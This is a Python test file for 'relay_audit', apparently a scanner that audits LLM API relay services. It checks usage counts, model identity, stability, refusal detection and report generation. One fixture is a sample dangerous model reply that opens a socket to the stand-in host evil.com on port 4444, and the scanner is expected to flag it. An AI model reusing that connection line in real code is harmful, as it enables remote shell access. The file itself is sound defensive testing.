"""Tests for relay_audit."""

from dataclasses import asdict

from relay_audit.scanner import TestCase
from relay_audit.cli import auto_select_model
from relay_audit.models import (
    ChatResult,
    Finding,
    ModelInfo,
    ScanConfig,
    ScanResult,
    Severity,
)
from relay_audit.patterns import (
    REFUSAL_PATTERNS,
    SAFETY_TEST_NAMES,
    redact,
    short,
)
from relay_audit.analysis import (
    analyze_chat,
    analyze_concurrent,
    analyze_models,
    analyze_stability,
    analyze_usage,
    mojibake_score,
)
from relay_audit.provider import detect_provider, Provider
from relay_audit.reporter import compute_pass_rate, generate_html


def test_testcase_defaults() -> None:
    tc = TestCase(name="defaults", messages=[{"role": "user", "content": "hi"}])
    assert tc.max_tokens == 200
    assert tc.kind == "quality"
    assert tc.response_format is None
    assert not tc.stream


def test_testcase_custom_values() -> None:
    tc = TestCase(
        name="custom",
        messages=[{"role": "user", "content": "hello"}],
        kind="identity",
        max_tokens=100,
        stream=True,
    )
    d = asdict(tc)
    assert d["name"] == "custom"
    assert d["max_tokens"] == 100
    assert d["kind"] == "identity"
    assert d["stream"] is True


def test_testcase_with_tools() -> None:
    tools = [
        {
            "type": "function",
            "function": {"name": "test", "description": "", "parameters": {}},
        }
    ]
    tc = TestCase(
        name="tools", messages=[{"role": "user", "content": "call"}], tools=tools
    )
    assert tc.tools == tools


def test_severity_ranks() -> None:
    assert Severity.CRITICAL.rank == 4
    assert Severity.HIGH.rank == 3
    assert Severity.MEDIUM.rank == 2
    assert Severity.LOW.rank == 1
    assert Severity.INFO.rank == 0


def test_redact() -> None:
    text = "my key is sk-abc123def456ghi789jkl012mno345"
    result = redact(text)
    assert "sk-abc123" not in result
    assert "[REDACTED]" in result


def test_short() -> None:
    text = "a" * 100
    assert len(short(text, 50)) <= 53


def test_mojibake_score() -> None:
    assert mojibake_score("Hello world") < 0.3
    assert mojibake_score("正常中文文本") < 0.3


def test_analyze_models_empty() -> None:
    findings = analyze_models([])
    assert any("没有模型列表" in f.title for f in findings)


def test_analyze_models_suspicious() -> None:
    models = [
        ModelInfo(id="gpt-9.9-turbo"),
        ModelInfo(id="free-router-pool"),
    ]
    findings = analyze_models(models)
    assert any("可疑" in f.title or "非标准" in f.title for f in findings)


def test_analyze_usage_normal() -> None:
    result = ChatResult(
        name="test",
        model_req="gpt-4",
        ok=True,
        latency_ms=1000,
        status=200,
        model_ret="gpt-4",
        content="Hello world" * 10,
        usage={"prompt_tokens": 50, "completion_tokens": 100, "total_tokens": 150},
        raw_id="",
        created=0,
    )
    findings = analyze_usage(result.usage, result)
    assert len(findings) == 0


def test_analyze_usage_mismatch() -> None:
    result = ChatResult(
        name="test",
        model_req="gpt-4",
        ok=True,
        latency_ms=1000,
        status=200,
        model_ret="gpt-4",
        content="Hi",
        usage={"prompt_tokens": 50, "completion_tokens": 100, "total_tokens": 200},
        raw_id="",
        created=0,
    )
    findings = analyze_usage(result.usage, result)
    assert any("计数不一致" in f.title for f in findings)


def test_refusal_patterns() -> None:
    assert REFUSAL_PATTERNS.search("I cannot help with that")
    assert REFUSAL_PATTERNS.search("抱歉，我不能提供这个内容")
    assert not REFUSAL_PATTERNS.search("这是正常的回答内容")


def test_analyze_chat_safety_refused() -> None:
    result = ChatResult(
        name="拒绝-破坏性",
        model_req="gpt-4",
        ok=True,
        latency_ms=1000,
        status=200,
        model_ret="gpt-4",
        content="I'm sorry, but I cannot provide code that deletes files.",
        usage={},
        raw_id="",
        created=0,
    )
    findings = analyze_chat(result, "safety")
    assert not any(f.severity.rank >= 3 for f in findings)


def test_analyze_chat_safety_dangerous() -> None:
    result = ChatResult(
        name="恶意代码",
        model_req="gpt-4",
        ok=True,
        latency_ms=1000,
        status=200,
        model_ret="gpt-4",
        content="import os\nos.system('echo test')\nimport socket\nsocket.connect(('evil.com', 4444))",
        usage={},
        raw_id="",
        created=0,
    )
    findings = analyze_chat(result, "safety")
    assert any(f.severity.rank >= 2 for f in findings)


def test_analyze_stability() -> None:
    lats = [100, 120, 110, 105, 115]
    conts = ['{"answer":"pong"}'] * 5
    findings = analyze_stability(conts, lats)
    assert any("延迟统计" in f.title for f in findings)


def test_analyze_stability_inconsistent() -> None:
    lats = [100, 120, 110]
    conts = ['{"answer":"a"}', '{"answer":"b"}', '{"answer":"c"}']
    findings = analyze_stability(conts, lats)
    assert any("结果不一致" in f.title for f in findings)


def test_analyze_concurrent() -> None:
    results = [
        ChatResult(
            name=f"burst_{i}",
            model_req="gpt-4",
            ok=True,
            latency_ms=100 + i * 10,
            status=200,
            model_ret="gpt-4",
            content="ok",
            usage={},
            raw_id="",
            created=0,
        )
        for i in range(3)
    ]
    findings = analyze_concurrent(results)
    assert any("并发测试延迟" in f.title for f in findings)


def test_scan_result_counts() -> None:
    config = ScanConfig(base_url="https://api.example.com")
    findings = [
        Finding(Severity.HIGH, "高危1", "detail"),
        Finding(Severity.HIGH, "高危2", "detail"),
        Finding(Severity.MEDIUM, "中危1", "detail"),
        Finding(Severity.LOW, "低危1", "detail"),
        Finding(Severity.INFO, "信息", "detail"),
    ]
    result = ScanResult(
        config=config,
        findings=findings,
        results=[],
        models=[],
        started_at="",
        duration_s=1.0,
    )
    assert result.high_count == 2
    assert result.med_count == 1
    assert result.low_count == 2
    assert result.risk_level == "HIGH"


def test_detect_provider() -> None:
    assert detect_provider("https://api.openai.com/v1") == Provider.OPENAI
    assert detect_provider("https://api.deepseek.com") == Provider.DEEPSEEK
    assert detect_provider("https://open.bigmodel.cn") == Provider.GLM
    assert detect_provider("https://unknown.example.com") == Provider.UNKNOWN


def test_auto_select_model() -> None:
    models = ["gpt-3.5-turbo", "gpt-4o", "claude-3-opus", "gemini-pro"]
    selected = auto_select_model(models, top_n=1)
    assert len(selected) == 1


def test_safety_test_names_defined() -> None:
    assert len(SAFETY_TEST_NAMES) > 0
    assert "Prompt隔离" in SAFETY_TEST_NAMES


def _sample_scan_result() -> ScanResult:
    config = ScanConfig(base_url="https://api.example.com", model="gpt-4o")
    results = [
        ChatResult(
            name="基础对话",
            model_req="gpt-4o",
            ok=True,
            latency_ms=320,
            status=200,
            model_ret="gpt-4o",
            content="OK",
            usage={"prompt_tokens": 5, "completion_tokens": 1, "total_tokens": 6},
            raw_id="r1",
            created=0,
        ),
        ChatResult(
            name="拒绝-破坏性",
            model_req="gpt-4o",
            ok=True,
            latency_ms=410,
            status=200,
            model_ret="gpt-4o",
            content="抱歉，我不能提供删除文件的代码。",
            usage={},
            raw_id="r2",
            created=0,
        ),
    ]
    return ScanResult(
        config=config,
        findings=[
            Finding(Severity.HIGH, "高危问题", "detail", "identity"),
            Finding(Severity.MEDIUM, "中危问题", "detail", "quality"),
        ],
        results=results,
        models=[ModelInfo(id="gpt-4o")],
        started_at="2026-07-11T10:00:00+00:00",
        duration_s=12.0,
    )


def test_compute_pass_rate_counts_refusals_as_pass() -> None:
    result = _sample_scan_result()
    effective_ok, total = compute_pass_rate(result.results)
    # 两项都是 ok=True，且其中安全测试被拒绝模式匹配 -> 都计入通过
    assert total == 2
    assert effective_ok == 2


def test_compute_pass_rate_excludes_diagnostic() -> None:
    config = ScanConfig(base_url="https://api.example.com")
    results = [
        ChatResult(
            name="稳定性_1",
            model_req="gpt-4o",
            ok=False,
            latency_ms=0,
            status=0,
            model_ret="",
            content="",
            usage={},
            raw_id="",
            created=0,
        ),
        ChatResult(
            name="基础对话",
            model_req="gpt-4o",
            ok=True,
            latency_ms=100,
            status=200,
            model_ret="gpt-4o",
            content="OK",
            usage={},
            raw_id="",
            created=0,
        ),
    ]
    result = ScanResult(
        config=config,
        findings=[],
        results=results,
        models=[],
        started_at="",
        duration_s=1.0,
    )
    effective_ok, total = compute_pass_rate(result.results)
    # 诊断测试 (稳定性_) 不计入分母
    assert total == 1
    assert effective_ok == 1


def test_list_html_reports_parses_current_template(tmp_path, monkeypatch) -> None:
    """回归测试: list_html_reports 必须能解析 generate_html 产出的当前模板。"""
    from relay_audit import serve

    result = _sample_scan_result()
    html = generate_html(result)
    report_file = tmp_path / "relay_report_20260711_100000.html"
    report_file.write_text(html, encoding="utf-8")

    monkeypatch.setattr(serve, "REPORTS_DIR", tmp_path)

    reports = serve.list_html_reports()
    assert len(reports) == 1
    r = reports[0]
    assert r["type"] == "html"
    assert r["file"] == "relay_report_20260711_100000.html"
    assert r["base_url"] == "https://api.example.com"
    assert r["risk_level"] == "HIGH"
    assert r["timestamp"] == "2026-07-11 10:00:00"
    # 高危1 + 中危1 = 2
    assert r["findings"] == 2
    assert r["tests_total"] == 2
    assert r["tests_passed"] == 2


def test_list_json_reports_round_trip(tmp_path, monkeypatch) -> None:
    """回归测试: persist_result 写入的 JSON 可被 list_json_reports 读取。"""
    from relay_audit import serve

    monkeypatch.setattr(serve, "REPORTS_DIR", tmp_path)
    result = _sample_scan_result()
    path = serve.persist_result(result, "https://api.example.com")
    assert path

    reports = serve.list_json_reports()
    assert len(reports) == 1
    r = reports[0]
    assert r["type"] == "json"
    assert r["base_url"] == "https://api.example.com"
    assert r["risk_level"] == "HIGH"
    assert r["findings"] == 2
    assert r["tests_total"] == 2
